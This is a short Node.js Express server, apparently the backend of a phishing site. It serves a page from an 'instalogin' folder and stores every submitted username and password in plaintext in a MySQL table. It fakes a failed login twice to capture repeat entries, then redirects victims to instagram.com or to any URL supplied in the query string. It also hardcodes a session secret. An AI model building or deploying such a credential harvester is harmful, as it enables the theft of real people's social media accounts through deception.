const express = require('express');
const path = require('path');
const mysql = require('mysql2');
const bodyParser = require('body-parser');
const session = require('express-session');

const app = express();
const PORT = 8080;

// Session middleware
app.use(session({
  secret: 'tripooly-secret',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }
}));

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// MySQL Connection
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: '', // Ganti sesuai
  database: 'tripooly_db' // Ganti sesuai
});

db.connect((err) => {
  if (err) throw err;
  console.log('✅ Connected to MySQL Database');
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/index.html'));
});

app.get('/about', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/about-us.html'));
});

app.get('/contact', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/contact-us.html'));
});

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/instalogin/index.html'));
});

// ✅ Login handler
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const redirectUrl = req.query.redirect || 'https://www.instagram.com';

  if (!req.session.attempts) req.session.attempts = 0;

  const sql = 'INSERT INTO users (username, password) VALUES (?, ?)';
  db.query(sql, [username, password], (err, result) => {
    if (err) {
      console.error('❌ Error inserting to DB:', err);
      return res.status(500).send('Database error');
    }

    req.session.attempts += 1;
    console.log(`🔐 Login attempt #${req.session.attempts} for ${username}`);

    if (req.session.attempts < 3) {
      return res.redirect('/login?error=1');
    } else {
      req.session.attempts = 0;
      return res.redirect(redirectUrl);
    }
  });
});

// Fallback
app.use((req, res) => {
  res.status(404).send('Page not found');
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
